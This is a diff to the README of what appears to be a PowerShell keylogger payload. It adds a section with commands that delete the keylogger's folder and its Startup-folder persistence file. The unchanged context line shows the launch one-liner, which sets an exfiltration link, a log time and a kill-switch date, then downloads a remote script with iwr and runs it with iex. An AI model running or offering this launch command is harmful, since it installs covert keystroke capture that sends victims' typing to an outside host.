@@ -69,6 +69,14 @@ Calling the script with both a `log` time and `killswitch` will look something l
 ```
 $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
 ```
+### DELETING THE KEYLOGGER
+
+You can use the following code to delete the keylogger 
+
+Or manually from those locations
+
+Remove-Item "$env:appdata\-locker" -Recurse -Force;
+Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
